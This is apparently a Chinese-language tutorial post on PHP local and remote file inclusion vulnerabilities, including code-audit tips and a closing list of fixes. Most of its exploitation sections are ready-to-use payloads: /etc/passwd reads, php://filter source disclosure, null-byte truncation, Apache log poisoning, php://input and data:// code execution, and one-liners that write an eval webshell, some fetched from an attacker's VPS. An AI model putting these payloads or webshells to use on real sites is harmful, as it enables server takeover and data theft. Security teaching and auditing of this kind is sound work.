---
title: 文件包含漏洞
date: 2020-1-22 20:03:00
---

## 本地文件包含(LFI)

文件包含漏洞的产生原因是 PHP 语言在通过引入文件时，引用的文件名，用户可控，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。

当被包含的文件在服务器本地时，就形成的本地文件包含漏洞。

### 漏洞利用

**利用条件：**

> （1）include()等函数通过动态变量的方式引入包含文件；
> （2）用户能够控制该动态变量。

**1、读取敏感文件**

```bash
?arg=/etc/passwd
```

**2、利用封装协议读源码**

```bash
?arg=php://filter/read=convert.base64-encode/resource=config.php	#这样能看到php文件的源码
```

**3、包含图片Getshell**

在上传的图片中写入恶意代码，然后用 LFI 包含调用，就会执行图片里的PHP代码

**4、截断包含**

漏洞代码：

```php
<?php
if(isset($_GET['arg']))
{
    include($_GET['arg'].".php"); 
}else{
    include(index.php);
 }
?>
```

这样做一定程度上修复了漏洞， 上传**图片一句话**并访问：`http://vuln.com/index.php?arg=1.jpg`会出错。

因为包含文件里面不存在`1.jpg.php`这个文件。

但是如果输入`http://vuln.com/index.php?arg=1.jpg%00`，就极有可能会绕过检测。

这种方法只适用于`php.ini`中`magic_quotes_qpc=off`并且`PHP`版本< 5.3.4的情况。

如果为on，%00会被转义，以至于无法截断。

**5、包含Apache日志Getshell**

> **条件：**知道日志文件access.log的存放位置 ，默认位置：`/var/log/httpd/access_log` 

`access.log`文件记录了客户端每次请求的相关信息；
当我们访问一个不存在的资源时`access.log`文件仍然会记录这条资源信息。 

如果目标网站存在文件包含漏洞，但是没有可以包含的文件时，

我们就可以尝试访问`http://www.vuln.com/<?php phpinfo(); ?>`

Apache会将这条信息记录在access.log文件中，这时如果我们访问access.log文件，就会触发文件包含漏洞。

理论上是这样的，但是实际上却是输入的代码被转义无法解析。

攻击者可以通过burpsuite进行抓包在http请求包里面将转义的代码改为正常的测试代码就可以绕过。

这时再查看Apache日志文件，显示的就是正常的测试代码。

这时访问：`http://www.vuln.com/index.php?arg=/var/log/httpd/access_log`，即可成功执行代码

### PHP中的封装协议(伪协议)

以下协议未写明条件的即是allow_url_fopen和allow_url_include状态off/on都行。

#### file://

**作用：**

用于访问本地文件系统，在CTF中通常用来读取本地文件,且不受allow_url_fopen与allow_url_include的影响。

`include()/require()/include_once()/require_once()`参数可控的情况下

如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的

**示例：**

```bash
#1. file://[文件的绝对路径和文件名]
http://127.0.0.1/include.php?file=file://C:\phpStudy\PHPTutorial\WWW\phpinfo.txt

#2. file://[文件的相对路径和文件名]
http://127.0.0.1/include.php?file=./phpinfo.txt

#3. file://[网络路径和文件名]
http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt
```

#### php://

**条件：**

```
allow_url_fopen:off/on

allow_url_include : 部分需要on (下面列出)

php://input

php://stdin

php://memory 

php://temp
```

**作用：**

php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是 `php://filter` 和 `php://input`

php://filter用于**读取源码**，php://input用于**执行**php代码

**示例：**

```bash
#1. php://filter/read=convert.base64-encode/resource=[文件名]  //读取文件源码
http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php

#2.php://input + [POST DATA]执行php代码
http://127.0.0.1/include.php?file=php://input
[POST DATA部分] <?php phpinfo(); ?>

#3.若有写入权限，[POST DATA部分] 写入一句话木马
<?php fputs(fopen('shell.php','w'),'<?php @eval($_GET[cmd]); ?>'); ?>
```

#### zip:// & bzip2:// & zlib://

**作用：**

`zip:// & bzip2:// & zlib://` 均属于压缩流，可以访问压缩文件中的子文件

更重要的是不需要指定后缀名，可修改为任意后缀：`jpg png gif xxx` 等等

**示例：**

```html
1.zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）
<!--压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传-->
http://127.0.0.1/include.php?file=zip://C:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt

2.compress.bzip2://file.bz2
<!--压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）-->
http://127.0.0.1/include.php?file=compress.bzip2://C:\phpStudy\PHPTutorial\WWW\phpinfo.bz2

3.compress.zlib://file.gz 
<!--压缩 phpinfo.txt 为 phpinfo.gz-->
http://127.0.0.1/include.php?file=compress.zlib://C:\phpStudy\PHPTutorial\WWW\phpinfo.gz
```

#### data://

**条件：**

allow_url_fopen:on

allow_url_include :on

**作用：**

自`PHP>=5.2.0`起，可以使用 `data://` 数据流封装器，以传递相应格式的数据。

通常可以用来执行PHP代码

**示例：**

```bash
#1.data://text/plain,
http://127.0.0.1/include.php?file=data://text/plain,<?php%20phpinfo();?>

#2.data://text/plain;base64,
http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
```

#### phar://

phar://协议与zip://类似，同样可以访问zip格式压缩包内容

```bash
http://127.0.0.1/include.php?file=phar://C:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt
```

**利用条件 `PHP > 5.3`**

要想使用Phar类里的方法，必须将`phar.readonly`配置项配置为0或Off

利用 phar 协议可以拓展 php 反序列化漏洞攻击面

## 远程文件包含(RFL)

服务器通过 PHP 的特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严格，

从而可以去包含一个恶意文件，攻击者就可以远程构造一个特定的恶意文件达到攻击目的。

### 漏洞利用

**条件：**`php.ini`中开启`allow_url_include`、`allow_url_fopen`选项。

**1、远程包含Webshell**

```bash
?arg=http://攻击者的VPS/shell.txt
#会在网站目录生成名为 shell.php 的一句话木马
```

**shell.txt内容为：**

```php
<?php
    fputs(fopen('./shell.php','w'),'<?php @eval($_POST[123]) ?>');
?>
```

### 代码审计

**文件包含用到的函数**

```php
include()		//使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。
inclue_once()	//功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。

require()		//使用此函数，只要程序执行，立即调用此函数包含文件发生错误时，会输出错误信息并立即终止程序。
require_once()	//功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。
```

代码审计的时候全局搜索以上函数

如果是基于图像上传的 ，要搜`$_FILES` 变量， 因为PHP处理上传文件的功能，基本都与$_FILES有关。

查看目录结构，重点关注includes、modules等文件夹，查看index.php等文件是否**动态调用**过这些内容，变量是否可控。

## 修复建议

> 1. 禁止远程文件包含 `allow_url_include=off`
> 2. 配置 `open_basedir=指定目录`，限制访问区域。
> 3. 过滤`../`等特殊符号
> 4. 修改Apache日志文件的存放地址
> 5. 开启魔术引号 `magic_quotes_qpc=on`
> 6. 尽量不要使用动态变量调用文件，直接写要包含的文件。